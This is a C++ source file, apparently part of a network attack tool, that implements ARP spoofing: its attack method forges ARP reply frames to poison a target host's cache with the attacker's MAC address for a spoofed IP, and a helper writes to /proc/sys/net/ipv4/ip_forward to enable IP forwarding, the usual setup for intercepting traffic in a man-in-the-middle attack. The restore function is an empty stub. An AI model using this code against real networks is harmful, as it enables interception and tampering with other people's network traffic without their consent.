#include <string>
#include <fstream>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <iostream>

#include "spoof.h"
#include "arp.h"

SpoofOperator::SpoofOperator(ARPOperator *arp_operator, std::string gateway_ip, std::map<std::string, std::string> *ip2mac_map)
{
    this->ip2mac_map = ip2mac_map;
    this->arp_operator = arp_operator;
    this->gateway_ip = gateway_ip;
    this->source_ip = arp_operator->get_local_ip();
    this->source_mac = arp_operator->get_local_mac();
}

int SpoofOperator::attack(std::string target_ip, std::string spoof_ip)
{
    // set opcode = 2
    arp_operator->set_mode(ARP_REPLY);

    // set pdst = target_ip
    // set hwdst = target_mac
    // set ether frame target & source
    arp_operator->set_ether_target(ip2mac_map->find(target_ip)->second);
    arp_operator->set_ether_source(source_mac);

    arp_operator->set_target(target_ip, ip2mac_map->find(target_ip)->second);
    arp_operator->set_source(spoof_ip, source_mac);

    // send packet
    arp_operator->list_frame_info();

    if (arp_operator->send() < 0) {
        std::cerr << "send operation failed" << std::endl;
        perror("arp_operator->send() failed");
        return 1;
    }
    return 0;
}

int SpoofOperator::restore(std::string target_ip)
{
    return 0;
}

int set_ip_forwarding(int toggle)
{
    std::ofstream ip_forward_file("/proc/sys/net/ipv4/ip_forward");
    if (!ip_forward_file.is_open()) {
        perror("toggle ip_forward failed");
        return -1;
    }

    ip_forward_file << toggle;
    ip_forward_file.close();

    std::cout << "IP forwarding enabled" << std::endl;
    return 0;
}
